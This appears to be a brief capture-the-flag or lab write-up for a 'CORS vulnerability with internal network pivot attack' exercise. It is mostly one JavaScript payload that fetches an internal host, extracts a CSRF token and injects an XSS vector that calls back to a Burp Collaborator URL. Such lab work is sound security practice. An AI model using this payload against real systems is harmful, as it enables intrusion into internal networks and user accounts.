CORS vulnerability with internal network pivot attack

The solution is very complex and explained way better than I could explain it. I'll just post the code for the step 2 as reference:

<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
  }
  ))
}

fetchUrl("http://192.168.0.251:8080", "http://s70brnrb8s8agzl6r9eg8bsgd7jy7n.burpcollaborator.net");
</script>